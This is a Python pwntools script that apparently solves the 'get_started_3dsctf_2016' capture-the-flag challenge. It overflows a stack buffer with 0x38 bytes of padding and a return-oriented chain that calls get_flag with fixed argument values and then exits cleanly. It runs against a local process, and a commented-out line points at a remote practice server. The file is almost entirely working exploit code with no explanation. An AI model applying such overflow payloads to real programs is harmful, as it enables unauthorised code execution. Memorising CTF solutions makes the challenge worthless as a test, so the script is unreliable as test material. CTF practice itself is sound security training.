#!/usr/bin/python3.6
from pwn import *

elf = ELF("./get_started_3dsctf_2016")
proc = process("./get_started_3dsctf_2016")
# proc = remote("node3.buuoj.cn", 29563)

# c gets
log.info(f"get_flag={hex(elf.sym['get_flag'])}")
# segfault
# payload = b'i'*0x38 + p32(elf.sym['get_flag']) + p32(elf.sym['main']) +  p32(0x308CD64F) + p32(0x195719D1)

# Peaceful exit
payload = b'i'*0x38 + \
  p32(elf.sym['get_flag']) + \
  p32(0x0806fc09) + \
  p32(0x308CD64F) + p32(0x195719D1) + \
  p32(elf.sym['exit']) + p32(0xdeadbeef) + p32(0)

# with open('input', 'wb') as f:
#   f.write(payload + b'\n')

proc.sendline(payload)

log.info(proc.recvall())
